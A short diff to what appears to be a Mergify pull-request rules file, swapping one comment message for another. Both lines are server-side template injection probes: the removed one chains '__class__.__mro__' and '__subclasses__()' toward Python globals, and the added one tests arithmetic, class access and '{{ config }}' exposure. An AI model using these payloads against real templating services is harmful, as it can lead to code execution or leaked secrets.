@@ -4,4 +4,4 @@ pull_request_rules:
       - base=main
     actions:
       comment:
-        message: "SSTI probe: {{ 7*7 }} mro: {{ ''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__ }}"
+        message: "VAR title={{ title }} num={{ number }} CALC={{ 7*7 }} MRO={{ ''.__class__ }} DICT={{ config }}"
